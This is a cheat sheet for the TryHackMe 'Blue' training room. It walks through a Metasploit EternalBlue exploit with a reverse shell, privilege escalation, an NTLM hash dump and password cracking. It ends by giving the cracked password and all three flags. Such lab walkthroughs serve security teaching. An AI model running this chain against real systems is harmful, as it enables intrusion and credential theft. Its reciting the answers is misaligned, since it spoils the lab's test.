# TryHackMe Blue — Cheat Sheet

**Target IP:** 10.02.23.124

## 1. Reconnaissance
```bash
nmap -Pn -p- -sV 10.02.23.124
# Look for port 445 open (SMB), vulnerable to MS17-010
```

## 2. Exploitation
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.02.23.124
set payload windows/x64/shell/reverse_tcp
set LHOST YOUR_TUN0_IP
set LPORT 4444
check
run
```

## 3. Convert Shell to Meterpreter
```bash
# Background the shell (CTRL+Z)
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
sessions -i NEW_SESSION_ID
```

## 4. Privilege Escalation
```bash
# Get SYSTEM
getsystem
getuid # Should be NT AUTHORITY\SYSTEM

# Migrate to stable SYSTEM process
ps # Find svchost.exe running as SYSTEM, note PID
migrate PID
```

## 5. Dump & Crack Hashes
```bash
hashdump
# Save Jon's NTLM hash to hash.txt
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Password: alqfna22
```

## 6. Flags
- **Flag 1:** `C:\flag*.txt` (`flag{access_the_machine}`)
- **Flag 2:** `C:\Windows\System32\config\flag*.txt` (`flag{sam_database_elevated_access}`)
- **Flag 3:** `C:\Users\Jon\Documents\flag*.txt` (`flag{admin_documents_can_be_valuable}`)
